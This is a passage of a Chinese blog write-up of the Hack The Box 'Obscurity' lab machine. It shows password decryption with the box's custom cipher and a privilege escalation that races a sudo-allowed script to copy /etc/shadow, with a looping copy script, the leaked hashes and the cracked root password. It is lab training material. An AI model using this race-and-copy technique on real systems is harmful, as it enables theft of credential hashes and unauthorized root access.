+<p>这里我遇到了一个难点，不知道如何将文件copy出来，本来我是可以通过 <code>python3 -m http.server 8001</code> 在靶机上开一个端口的，但是不知道为什么不成功。所以我这里是通过xxd来复原的</p>
+</blockquote>
+<p>将 xxd 得到的结果复制出来，然后我们可以通过<code>xxd -r</code> 反向 <code>dump</code> 出结果</p>
+<pre><code>robert@obscure:~$ xxd out.txt
+00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................
+00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................
+00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................
+00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................
+00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................
+00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................
+00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................
+00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................
+00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................
+00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................
+000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................
+000000b0: c38c c397 c289 c281 76                   ........v</code></pre><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>得到密钥之后我们再解密即可</p>
+<pre><code class="bash">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/key.txt -k alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal -d
+k alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal -d
+################################
+#           BEGINNING          #
+#    SUPER SECURE ENCRYPTOR    #
+################################
+  ############################
+  #        FILE MODE         #
+  ############################
+Opening file passwordreminder.txt...
+Decrypting...
+Writing to /tmp/key.txt...
+www-data@obscure:/home/robert$ cat /tmp/key.txt
+cat /tmp/key.txt
+SecThruObsFTW</code></pre>
+<p>成功登陆</p>
+<p>拿到 flag</p>
+<pre><code class="bash">robert@obscure:~$ ls
+BetterSSH  check.txt  out.txt  passwordreminder.txt  SuperSecureCrypt.py  user.txt
+robert@obscure:~$ cat user.txt
+e4493782066b55fe2755708736ada2d7</code></pre>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>robert用户登陆之后，<code>sudo -l</code> 查看能够执行的root命令，发现能够以root身份执行 <code>BetterSSH.py</code></p>
+<pre><code class="bash">robert@obscure:~$ sudo -l
+Matching Defaults entries for robert on obscure:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User robert may run the following commands on obscure:
+    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code></pre>
+<p>审计源码发现关键点：</p>
+<pre><code class="python">with open(&#39;/etc/shadow&#39;, &#39;r&#39;) as f:
+    data = f.readlines()
+data = [(p.split(&quot;:&quot;) if &quot;$&quot; in p else None) for p in data]
+passwords = []
+for x in data:
+    if not x == None:
+        passwords.append(x)
+
+passwordFile = &#39;\n&#39;.join([&#39;\n&#39;.join(p) for p in passwords])
+with open(&#39;/tmp/SSH/&#39;+path, &#39;w&#39;) as f:
+    f.write(passwordFile)</code></pre>
+<p>程序会将 <code>/etc/shadow</code> 写入到 <code>/tmp/SSH</code> 的某个随机的目录中，于是想到我们只需要写个死循环不断地复制该目录下的文件即可</p>
+<pre><code class="python">import shutil
+import os
+while True:
+    files = os.listdir(&quot;./SSH&quot;)
+    for file in files:
+        shutil.copy(os.path.join(&quot;./SSH&quot;, file), &quot;./flag&quot;);</code></pre>
+<p>或者使用 <code>shell</code> 脚本</p>
+<pre><code class="shell">robert@obscure:/tmp$ cat scandir.sh
+#/bin/bash
+path=$1
+while (true); do
+    file=$(ls $path)
+    if [ &quot;${file}&quot; == &quot;&quot; ]
+    then
+        continue
+    else
+        mv $path/$file ./
+        break
+    fi
+done</code></pre>
+<p>然后我们执行就会发现 <code>flag</code> 目录中存在文件</p>
+<pre><code class="python">robert@obscure:/tmp/flag$ ls
+Tdrs5183
+robert@obscure:/tmp/flag$ cat Tdrs5183
+root
+$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
+18226
+0
+99999
+7
+
+
+
+
+robert
+$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
+18163
+0
+99999
+7</code></pre>
+<p>john 解密得到 <code>mercedes</code></p>
+<pre><code class="bash">robert@obscure:/tmp$ sudo python3 ~/BetterSSH/BetterSSH.py
+Enter username: root
+Enter password: mercedes
+Authed!
+root@Obscure$ ls
+Output: SSH
+systemd-private-da1116f9cf3e43be847886abe5bdf51e-systemd-resolved.service-zZTUtH
+systemd-private-da1116f9cf3e43be847886abe5bdf51e-systemd-timesyncd.service-AkWIWi
+vmware-root_574-2990744286
+
+
+root@Obscure$ cat /root/root.txt
+Output: 512fd4429f33a113a44d5acde23609e3</code></pre>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做完后感觉并不是很难，但是还是发现自己在代码的能力偏弱，写个脚本要花很长的时间</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>HTB Obscurity靶机实战</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">3k</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="prontosil">prontosil</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-02-05, 21:50:54</p>
+    <p><span class="copy-title">最后更新:</span>2020-02-05, 22:23:17</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/a0911a0b/" title="HTB Obscurity靶机实战">http://prontosil.com/posts/a0911a0b/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+    <section id="comments" class="disqus">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'http://prontosil.com/posts/a0911a0b/';
+            this.page.identifier = 'posts/a0911a0b/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//https-prontosil-club.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <aside class="comment-bar">
+        <a>
+            <i class="fa fa-commenting-o animated infinite pulse"></i>
+            <i class="fa fa-spinner fa-pulse"></i>
+            <span class="count-comment"></span>
+        </a>
+    </aside>
+    <script>
+        var isLoadComments = false;
+        var $commentBar = $("#comments aside.comment-bar");
+        var load$hide = function(){
+            if(isLoadComments){
+                return;
+            }
+            isLoadComments = true;
+            if(isLoadComments )
+            $commentBar.find("a > i").toggle();
+            loadComment();
+            $commentBar.fadeOut(800);
+        }
+        $commentBar.click(function(){
+            load$hide();
+        })
+        $commentBar.children("a").mouseenter(function(){
+            load$hide();
+        })
+    </script>
+
+
+</section>
+
+<!-- Add comment count-->
+<span class="disqus-comment-count" style="display: none" data-disqus-identifier="posts/a0911a0b/"></span>
+<span class="disqus-comment-count" style="display: none" data-disqus-url="http://prontosil.com/posts/a0911a0b/"></span>
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2016-2020 prontosil</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#HTB','#靶机','#JavaScript','#docker','#xxe','#xml','#php','#函数','#java','#反序列化','#文件上传','#cms','#域名','#Linux','#dig','#xxd','#hexdump','#leetcode','#汇编','#dosbox','#Apache','#RCE','#SSI','#截断',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
